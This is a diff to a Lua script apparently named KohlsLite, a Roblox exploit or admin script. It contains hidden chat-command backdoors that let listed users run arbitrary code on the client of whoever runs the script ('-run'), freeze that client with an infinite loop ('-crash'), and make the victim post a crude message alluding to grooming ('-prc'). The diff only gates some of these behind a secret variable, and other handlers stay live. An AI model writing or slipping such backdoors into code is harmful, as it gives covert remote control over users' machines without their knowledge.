@@ -117,7 +117,7 @@ getgenv().kohlsexecuted = true
 getgenv().deprefix = "." 
 
 -- The version of KohlsLite
-getgenv().klversion = "um what rhe sigma"
+getgenv().klversion = "knocks is the best"
 
 -- Chat function
 local function Chat(msg)
@@ -8469,7 +8469,9 @@ v.Chatted:Connect(function(msg)
                 end
 
         	if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                	Speak("atprog groomed me")
+                                if thesecretvariable == true then 
+					Speak("atprog groomed me") 
+				end
                 end
 
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -8516,8 +8518,10 @@ v.Chatted:Connect(function(msg)
                 end
 
                 if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                     while true do end
+                                if thesecretvariable == true then 
+				       while true do end
                                 -- game:Shutdown()
+				end
                 end
 
            	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -8527,7 +8531,9 @@ v.Chatted:Connect(function(msg)
     		end
 
            	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-        				Execute(string.sub(msg, 6))
+        			if thesecretvariable == true then
+				        Execute(string.sub(msg, 6))
+			        end
     		end
 
            	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
